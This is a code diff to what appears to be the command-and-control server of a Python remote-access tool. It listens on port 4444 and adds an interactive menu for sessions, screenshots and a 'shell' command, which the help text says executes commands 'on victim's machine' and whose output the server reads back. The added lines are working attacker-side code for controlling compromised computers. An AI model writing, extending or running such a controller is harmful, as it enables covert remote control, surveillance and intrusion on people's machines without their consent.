@@ -3,6 +3,8 @@ from colorama import *
 from time import sleep
 from os import system, getenv, name
 from usefull import *
+import json
+
 ## set the clear command by os name
 windows = False
 if name == 'nt': ## windows
@@ -18,6 +20,8 @@ else: ## linux distrib.
 
 ## init colorama to dodge the problems
 init()
+
+
 
 class Server:
     def start(SERVER_PORT=4444, SERVER_HOST="0.0.0.0"):
@@ -44,6 +48,27 @@ class Server:
 
         cwd = client_socket.recv(BUFFER_SIZE).decode()
         print(f"{info}Current working directory: {cyan}{cwd}{reset}")
+        while True:
+            cmd = input(f"{magenta}>{cyan}")
+            reset
+            if cmd == "help":
+                print(f"""
+                {magenta}help            {cyan}display this message
+                {magenta}sessions        {cyan}display all sessions
+                {magenta}sessions {lightRed}<id>   {cyan}switch to the session with the same id
+                {magenta}screenshot      {cyan}do a screenshot and save it
+                {magenta}shell {lightRed}<command> {cyan}execute the command you want on victim's machine
+                {reset}                
+                """)
+            elif cmd[0:5] == "shell":
+                command_shell = cmd[6:len(cmd)+1]
+                if not command_shell.strip():
+                    # empty command
+                    continue
+                # send the command to the client
+                client_socket.send(cmd.encode())
+                output = client_socket.recv(BUFFER_SIZE).decode()
+                print(f'{magenta}Shell: {cyan}{output}')
 
         while True:
             # get the command from prompt
